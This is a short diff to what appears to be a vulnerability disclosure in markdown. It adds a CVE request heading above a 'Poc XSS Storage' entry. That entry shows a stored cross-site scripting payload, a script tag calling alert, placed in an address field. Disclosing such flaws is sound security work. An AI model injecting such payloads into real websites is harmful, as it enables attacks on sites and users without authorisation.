@@ -84,7 +84,7 @@ Poc XSS Reflect:
 
 ___
 
-## 
+## CVE Request 1928485
 Poc XSS Storage:
 
 - Addres: "><script>alert("Carlos%20Tuma%20-%20Bl4dsc4n")</script>
